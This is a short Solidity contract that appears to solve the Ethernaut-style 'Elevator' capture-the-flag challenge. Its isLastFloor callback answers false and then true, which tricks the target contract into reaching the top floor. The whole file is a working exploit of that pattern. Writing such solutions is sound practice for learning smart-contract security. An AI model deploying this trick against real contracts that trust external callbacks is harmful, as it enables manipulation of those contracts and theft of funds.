pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorSolver is Building {
    IElevator challenge;
    bool init = true;

    constructor(address payable addr) public {
        challenge = IElevator(addr);
    }

    function solve() external {
        challenge.goTo(1337);
    }

    function isLastFloor(uint256) override external returns (bool) {
        if(init) {
            init = false;
            return false;
        } else {
            return true;
        }
    }
}
